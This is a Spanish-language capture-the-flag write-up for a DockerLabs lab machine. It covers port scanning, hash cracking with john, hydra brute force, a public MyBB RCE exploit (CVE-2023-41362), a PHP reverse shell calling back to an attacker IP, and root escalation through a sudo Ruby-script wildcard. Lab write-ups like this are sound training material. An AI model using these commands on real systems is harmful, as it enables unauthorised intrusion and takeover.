<img width="508" height="304" alt="image" src="https://github.com/user-attachments/assets/7a346a2a-c523-48ca-bdf1-76e026c0f5a7" />



# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)


# Escaneo de puertos 

usaremos el siguinete comando con nmap:

```ruby
nmap -p- -Pn -sVCS --min-rate 5000 172.17.0.2
``` 
<img width="535" height="170" alt="image" src="https://github.com/user-attachments/assets/02308f54-d7ed-4f3d-bf54-b539a75b3d47" />

estos nos mostrara los servcios y puertos disponiles 

Nos iremos al puerto 80 como nos indica el nmap veremos lo siguiente:

<img width="1271" height="826" alt="image" src="https://github.com/user-attachments/assets/03052344-ff50-4a68-b4f8-bd0271a47816" />

al darle click a forum nos saltara no estamos autorizados, lo agregaremos a /etc/host ```echo '172.17.0.2 HackZones.hl' >> /etc/hosts ``` veremos lo siguiente

<img width="1274" height="751" alt="image" src="https://github.com/user-attachments/assets/52e3af2c-fe38-465c-96db-f5f4bbbbbe51" />

# Enumeracion de directorios y servicios

```ruby whatweb http://172.17.0.2:80```

<img width="823" height="69" alt="image" src="https://github.com/user-attachments/assets/605e5f43-2303-43e6-b107-a8bf123a1f81" />

```ruby
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt
```
<img width="975" height="415" alt="image" src="https://github.com/user-attachments/assets/31418b44-c57b-43d0-9305-663724848c9f" />

no vemos nada importante

Usaremos dirb para mayor busqueda de contendio web oculto 

<img width="484" height="597" alt="image" src="https://github.com/user-attachments/assets/12fba66f-dc9e-4c18-b169-b5b062fd52ed" />

veremos un directorio llamado backups que tendra un archivo llamado data 

<img width="1029" height="852" alt="image" src="https://github.com/user-attachments/assets/1be97a77-3cb9-46f4-a601-9f84c9035bce" />

veremos algo interesante, un nombre de usuario: alice , password: $2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi

pondremos la password en un archivo .txt y usaremos john 

```bash
john password.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
tinkerbell   	(?)	 
1g 0:00:01:33 DONE 2/3 (2024-06-23 02:49) 0.01070g/s 20.04p/s 20.04c/s 20.04C/s tasha..vampire
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

alice:tinkerbell esta credenciales no funcionaron y iremos con el user 'admin;

# Explotacion 

Usaremos la herramienta con hydra

```ruby
hydra -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:username=^USER^&password=^PASS^&do=login:F=Login failed"

DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://panel.mybb.dl:80/admin/index.php:username=^USER^&password=^PASS^&do=login:F=Login failed
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 1234567
[80][http-post-form] host: panel.mybb.dl   login: admin   password: password
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456789
[80][http-post-form] host: panel.mybb.dl   login: admin   password: iloveyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345678
[80][http-post-form] host: panel.mybb.dl   login: admin   password: daniel
[80][http-post-form] host: panel.mybb.dl   login: admin   password: monkey
[80][http-post-form] host: panel.mybb.dl   login: admin   password: nicole
[80][http-post-form] host: panel.mybb.dl   login: admin   password: lovely
[80][http-post-form] host: panel.mybb.dl   login: admin   password: jessica
[80][http-post-form] host: panel.mybb.dl   login: admin   password: abc123
[80][http-post-form] host: panel.mybb.dl   login: admin   password: princess
[80][http-post-form] host: panel.mybb.dl   login: admin   password: rockyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
```
Esto nos indica que el usario tiene varias password, las credenciales son admin/babygirl al iniciar veremos lo siguiente:

<img width="1273" height="763" alt="image" src="https://github.com/user-attachments/assets/1ee9320b-040a-4c6a-a47e-70dedbc7b673" />

veremos una version de MyBB 1.8.35 vulnerable buscaremos en google que nos pueda ayudar con esta version

buscando por google encontramos algo y es un CVE-2023-41362. 
Nos descagaremos 
```ruby
 git clone https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE.git
```
podremos ejecutarlo con python 
```ruby
python3 exploit.py http://panel.mybb.dl/ admin babygirl
```

nos conectaremos ala maquina victiima aremos un tratamiento de shell

```
script /dev/null -c bash 
CTRL + Z 
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

nos pondremos en escucha con NC en otra terminal, manderemos un revershell con php y reciviermos la conexion en otro terminal

```ruby
php -r '$sock=fsockopen("192.168.0.26",443);shell_exec("bash <&3 >&3 2>&3");'
```


comprobamos que si llego y aremos un sudo alice ya que tenemos las credenciales anteriormente 
```ruby
www-data@caab0e34ad54:/var/www/mybb$ su alice
Password:
alice@caab0e34ad54:/var/www/mybb$
```

comprobaremos los permisos de sudo 

```ruby 
alice@caab0e34ad54:/var/www/mybb$ sudo -l
Matching Defaults entries for alice on caab0e34ad54:
	env_reset, mail_badpass,
	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
	use_pty

User alice may run the following commands on caab0e34ad54:
	(ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb

```

en el usuario puede aprovechar de ejecutar cualquier script, el script Ruby (*.rb) como root sin necesidad de contraseña


Creamos un script en Ruby en el directorio /scripts
```ruby
echo 'exec "/bin/bash"' > /home/alice/scripts/root.rb
Le otorgamos permisos
chmod +x root.rb
```
ejecutamos el script y ya seremos root

```bash 
alice@caab0e34ad54:~/scripts$ sudo /home/alice/scripts/root.rb
root@caab0e34ad54:/home/alice/scripts# whoami
root
```
